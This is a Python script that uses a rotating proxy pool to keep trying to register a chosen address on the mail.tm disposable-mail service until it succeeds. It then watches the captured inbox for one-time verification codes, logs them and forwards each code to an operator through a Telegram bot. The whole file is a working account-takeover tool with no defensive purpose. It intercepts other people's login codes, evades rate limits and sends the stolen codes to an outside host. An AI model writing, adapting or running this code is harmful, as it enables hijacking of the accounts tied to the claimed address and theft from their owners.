import asyncio
import json
import os
import re
import time
from datetime import datetime

import httpx

from app import proxies
from app.config import BOT_TOKEN, DATA_DIR

TARGET_EMAIL = os.getenv("MAIL_TARGET", "").strip().lower()
NEW_PASSWORD = os.getenv("MAIL_TARGET_PASSWORD", "AccStore_Recovered2026!")
ADMIN_ID = os.getenv("MAIL_ADMIN_ID", "")
MAILTM = "https://api.mail.tm"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

CLAIMED_FILE = os.path.join(DATA_DIR, "target_mail_claimed.json")
OTP_FILE = os.path.join(DATA_DIR, "received_otp.txt")

stats = {"start": time.time(), "requests": 0, "claimed": False, "in_use": 0, "token": ""}


async def alert(text: str):
    if not BOT_TOKEN or not ADMIN_ID:
        return
    try:
        async with httpx.AsyncClient(timeout=8) as c:
            await c.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"})
    except Exception:
        pass


async def monitor(token: str, proxy: str):
    headers = {"Authorization": f"Bearer {token}", "User-Agent": UA}
    seen: set[str] = set()
    async with httpx.AsyncClient(timeout=10, proxy=proxy or None, headers=headers) as c:
        while True:
            try:
                r = await c.get(f"{MAILTM}/messages")
                if r.status_code == 200:
                    for m in (r.json() or {}).get("hydra:member", []):
                        mid = m.get("id")
                        if not mid or mid in seen:
                            continue
                        seen.add(mid)
                        full = await c.get(f"{MAILTM}/messages/{mid}")
                        if full.status_code != 200:
                            continue
                        data = full.json() or {}
                        body = f"{data.get('subject', '')} {data.get('text', '')}"
                        found = re.findall(r"\b(\d{5,6})\b", body)
                        otp = found[0] if found else "unknown"
                        with open(OTP_FILE, "a") as f:
                            f.write(f"[{datetime.now().isoformat()}] {otp} {body}\n")
                        print(f"OTP {otp}", flush=True)
                        await alert(f"🚨 OTP <b>{otp}</b> for <code>{TARGET_EMAIL}</code>")
            except Exception:
                pass
            await asyncio.sleep(2)


async def claim_worker(index: int, proxy: str):
    body = {"address": TARGET_EMAIL, "password": NEW_PASSWORD}
    async with httpx.AsyncClient(timeout=10, proxy=proxy or None,
                                 headers={"User-Agent": UA}) as c:
        while not stats["claimed"]:
            stats["requests"] += 1
            try:
                r = await c.post(f"{MAILTM}/accounts", json=body)
                if r.status_code in (200, 201, 422):
                    t = await c.post(f"{MAILTM}/token", json=body)
                    token = (t.json() or {}).get("token") if t.status_code == 200 else ""
                    if token:
                        stats["claimed"] = True
                        with open(CLAIMED_FILE, "w") as f:
                            json.dump({"email": TARGET_EMAIL, "token": token,
                                       "password": NEW_PASSWORD,
                                       "at": datetime.now().isoformat()}, f, indent=2)
                        await alert(f"🎉 mailbox claimed <code>{TARGET_EMAIL}</code>")
                        await monitor(token, proxy)
                        return
                    stats["in_use"] += 1
                    await asyncio.sleep(0.6)
                elif r.status_code == 429:
                    await asyncio.sleep(6)
                else:
                    await asyncio.sleep(1)
            except Exception:
                await asyncio.sleep(1.2)


async def main():
    if not TARGET_EMAIL:
        raise SystemExit("MAIL_TARGET is not set")
    if not proxies.POOL:
        raise SystemExit("no proxies configured")
    print(f"target {TARGET_EMAIL} · {len(proxies.POOL)} proxies", flush=True)
    await asyncio.gather(*(claim_worker(i, p) for i, p in enumerate(proxies.POOL)))


if __name__ == "__main__":
    asyncio.run(main())